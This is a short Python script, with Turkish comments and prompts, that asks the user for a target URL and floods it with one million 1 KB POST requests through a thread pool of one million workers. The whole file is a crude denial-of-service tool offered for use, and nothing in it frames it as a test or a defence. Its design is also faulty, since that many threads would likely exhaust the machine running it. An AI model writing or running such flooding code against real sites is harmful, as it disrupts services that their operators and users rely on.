# -*- coding: utf-8 -*-

import requests
import concurrent.futures

def send_data(target_url):
    data = "x" * 1024  # Gönderilecek veri, 1024 byte uzunlugunda "x" karakterleri
    try:
        response = requests.post(target_url, data=data)
        print(f"Response: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_url = input("Hedef URL'yi girin: ")
    num_requests = 1000000  # 1M veri gönderilecek

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = [executor.submit(send_data, target_url) for _ in range(num_requests)]

        for future in concurrent.futures.as_completed(futures):
            future.result()

    print("SUCCES")